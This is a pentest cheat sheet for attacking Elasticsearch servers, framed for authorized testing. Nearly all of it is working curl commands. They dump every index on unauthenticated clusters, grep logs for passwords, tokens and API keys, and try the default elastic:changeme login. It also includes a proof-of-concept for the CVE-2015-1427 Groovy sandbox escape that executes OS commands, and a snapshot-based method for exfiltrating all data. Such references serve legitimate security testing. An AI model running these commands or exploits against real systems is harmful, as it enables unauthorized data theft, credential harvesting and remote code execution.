---
service: elasticsearch
title: Elasticsearch
ports: 9200, 9300
aliases: elastic, es
---

# Elasticsearch — quick wins

**When you see it:** 9200/tcp open and `curl -s http://H:9200/` returns a JSON banner with
`cluster_name` and no `401` → unauthenticated, full read (and often write) access to all
indices. Security (`xpack.security.enabled`) was off by default through ES 7.x.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target — get
> sign-off before creating or modifying indices.

## Triage (read-only)
```sh
curl -s http://H:9200/                          # banner: version, cluster name
curl -s http://H:9200/_cat/nodes?v              # node list, roles, versions
curl -s http://H:9200/_cat/indices?v            # all indices, doc counts, sizes
curl -s "http://H:9200/_xpack/security/user"    # auth disabled = 500 error; enabled = 401
curl -s http://H:9200/_cluster/health           # cluster status + shard count
```

## Quick wins

### Dump an entire index
```sh
# list indices first, then dump one:
curl -s "http://H:9200/<INDEX>/_search?pretty=true&size=9999"
```
*Why:* no auth required on unprotected nodes; `size=9999` overrides the default 10-doc
limit. Indices named `logstash-*`, `filebeat-*`, `.security`, `users`, `passwords` are
high value.

### Dump everything across all indices
```sh
curl -s "http://H:9200/_search?pretty=true&size=1000"
# paginate with scroll for large datasets:
curl -s "http://H:9200/_search?scroll=1m&size=500" -H 'Content-Type: application/json' \
  -d '{"query":{"match_all":{}}}'
```
*Why:* single request returns documents from every index the anonymous user can read.

### Search for credential keywords
```sh
curl -s "http://H:9200/_search?q=password&pretty=true&size=100"
curl -s "http://H:9200/_search?q=secret+OR+token+OR+api_key&pretty=true&size=100"
```
*Why:* Elasticsearch full-text search makes targeted keyword extraction trivial across
millions of log documents.

### Enumerate users (auth-enabled nodes)
```sh
curl -s http://H:9200/_security/user           # requires manage_security or superuser
curl -s http://H:9200/_security/role
# default password for old 'elastic' superuser:
curl -s http://elastic:changeme@H:9200/
```
*Why:* older ES clusters ship `elastic:changeme`; list reveals which accounts have
`superuser` role.

### CVE-2015-1427 — Groovy sandbox escape → RCE ✏️
*Affects ES < 1.4.3 and < 1.3.8 with dynamic scripting enabled.*
```sh
# confirm dynamic scripting is on (returns {"dynamic":true,...}):
curl -s "http://H:9200/_cluster/settings?pretty"

# PoC: execute 'id' via Groovy
curl -s "http://H:9200/_search" -H 'Content-Type: application/json' -d '{
  "size":1,
  "query":{"filtered":{"query":{"match_all":{}}}},
  "script_fields":{"rce":{"script":
    "java.lang.Math.class.forName(\"java.lang.Runtime\")
      .getMethod(\"exec\",String.class)
      .invoke(java.lang.Math.class.forName(\"java.lang.Runtime\")
        .getMethod(\"getRuntime\").invoke(null),\"id\")"
  }}
}'
```
*Why:* the Groovy sandbox can be escaped via `Math.class.forName()` to reach
`java.lang.Runtime.exec`; no auth required. Old ELK stacks on legacy SIEM/logging boxes
are still common.

### _snapshot exfiltration ✏️
```sh
# list configured snapshot repositories:
curl -s http://H:9200/_snapshot?pretty
# trigger a snapshot to a writable repo (e.g. fs type):
curl -s -X PUT "http://H:9200/_snapshot/<REPO>/<SNAP>?wait_for_completion=true"
# restore to your own node or read snapshot files if repo path is accessible
```
*Why:* if a filesystem or S3 snapshot repository is registered, you can snapshot all
indices and exfiltrate the data as files from the repo path.

## aranum helpers
- `enum-elastic.sh` — the dispatcher that produced the finding (banner, node list, index
  enumeration).

## Gotchas
- ES 8.0+ enables TLS and auth by default; you'll get a `401` or TLS handshake failure
  — try `https://` and check for a misconfigured or self-signed cert.
- Port 9300 is the transport (node-to-node) port; pentesting tools target 9200 (REST API).
- `_cat/indices` returning only system indices (`.`) with a `yellow` status usually means
  auth IS enforced on data indices — test explicitly.
- Kibana (5601) often runs alongside; a Kibana UI without auth may expose dashboards with
  clickable data even when ES requires auth.
- CVE-2015-1427 requires `script.disable_dynamic: false` (the default pre-1.4.3) — check
  `_cluster/settings` before running the exploit.

## Sources
- HackTricks `9200-pentesting-elasticsearch` (ivanversluis/pentest-hacktricks mirror);
  CVE-2015-1427 (t0kx/exploit-CVE-2015-1427 on GitHub); Elastic REST API docs.
